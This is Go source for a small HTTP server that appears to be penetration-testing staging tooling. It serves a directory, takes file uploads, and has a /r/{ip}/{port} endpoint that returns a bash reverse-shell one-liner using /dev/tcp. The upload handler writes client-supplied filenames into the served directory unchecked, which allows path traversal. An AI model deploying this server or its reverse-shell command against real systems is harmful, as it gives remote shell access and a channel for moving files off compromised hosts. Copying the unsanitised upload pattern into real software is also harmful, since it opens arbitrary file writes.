package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
)

type serverConfig struct {
	directory string
	port      int
}

func main() {
	config := parseFlags()
	startServer(config)
}

func parseFlags() serverConfig {
	var config serverConfig
	flag.StringVar(&config.directory, "dir", ".", "the directory to serve files from")
	flag.IntVar(&config.port, "port", 8080, "the server port")
	flag.Parse()
	return config
}

func startServer(config serverConfig) {
	mux := http.NewServeMux()
	mux.Handle("/", http.FileServer(http.Dir(config.directory)))
	mux.HandleFunc("/u", makeUploadHandler(config.directory))
	mux.HandleFunc("/r/{ip}/{port}", reverseShellHandler)

	server := &http.Server{
		Addr:    fmt.Sprintf(":%d", config.port),
		Handler: loggingMiddleware(mux),
	}
	log.Printf("Serving %s on HTTP port: %d\n", config.directory, config.port)
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
}

func makeUploadHandler(dir string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "GET" {
			fmt.Fprintf(w, "curl -X POST -F \"file=@/path/to/yourfile.ext\" http://ip/u")
			return
		}
		if r.Method != "POST" {
			http.Error(w, "Only POST method is allowed", http.StatusMethodNotAllowed)
			return
		}
		if err := r.ParseMultipartForm(0); err != nil {
			http.Error(w, fmt.Sprintf("Parse form error: %v", err), http.StatusInternalServerError)
			return
		}
		file, handler, err := r.FormFile("file")
		if err != nil {
			http.Error(w, fmt.Sprintf("Retrieve file error: %v", err), http.StatusInternalServerError)
			return
		}
		defer file.Close()

		dstPath := fmt.Sprintf("%s/%s", dir, handler.Filename)
		dst, err := os.Create(dstPath)
		if err != nil {
			http.Error(w, fmt.Sprintf("File creation error: %v", err), http.StatusInternalServerError)
			return
		}
		defer dst.Close()

		if _, err := io.Copy(dst, file); err != nil {
			http.Error(w, fmt.Sprintf("File save error: %v", err), http.StatusInternalServerError)
			return
		}

		log.Printf("File uploaded successfully: %s", handler.Filename)
		fmt.Fprintf(w, "File uploaded successfully: %s", handler.Filename)
	}
}

func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "/bin/bash -c '/bin/sh -i >& /dev/tcp/%s/%s 0>&1'", r.PathValue("ip"), r.PathValue("port"))
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		log.Printf("Received request: %s %s from %s with headers: %v", r.Method, r.URL, r.RemoteAddr, r.Header)
		next.ServeHTTP(w, r)
	})
}
